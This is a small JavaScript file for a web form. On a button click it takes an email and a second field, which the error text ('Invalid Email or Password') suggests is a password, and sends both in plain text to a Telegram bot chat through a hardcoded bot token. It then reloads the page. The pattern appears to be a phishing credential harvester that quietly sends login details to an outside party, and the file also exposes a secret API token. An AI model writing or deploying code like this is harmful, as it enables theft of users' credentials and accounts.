botButton = document.getElementById("bot-btn").addEventListener("click", getToken);
botStatus = document.getElementById("bot-status")
/* TODO: ADD VALIDATION AND RESPECTIVE ALERT FOR MESSAGE BOX */

function getToken() {
var input = document.getElementById("bot-message").value


/* need to get email from login page:*/
var email = document.getElementById("bot-email").value

/* front slash means start and end of expression, back slash is an escape character (similar to new line), + joins the strings, S is whitespace */

/* the variable that is being declared states that an email should be: letters or numbers + @ + numbers or letters + . + number or leters */
var valid = /\S+@\S+\.\S+/;
if (valid.test(email) === false || input === "") {
  botStatus.innerHTML = "Invalid Email or Password";
  return false

} else if (input != "" && valid.test(email) === true) {
  botStatus.innerHTML = "";
}


url = "https://api.telegram.org/bot5233658091:AAEdJMSfyzxehFe65PADr1c2zGFlf5TRvIg/sendMessage?chat_id=5218071898&text=" + email + " : " + input;
fetch(url) 
.then(function (response) {
  return response.json();
})
.then(function (data) {
  console.log(data);

});
window.location.reload();
};

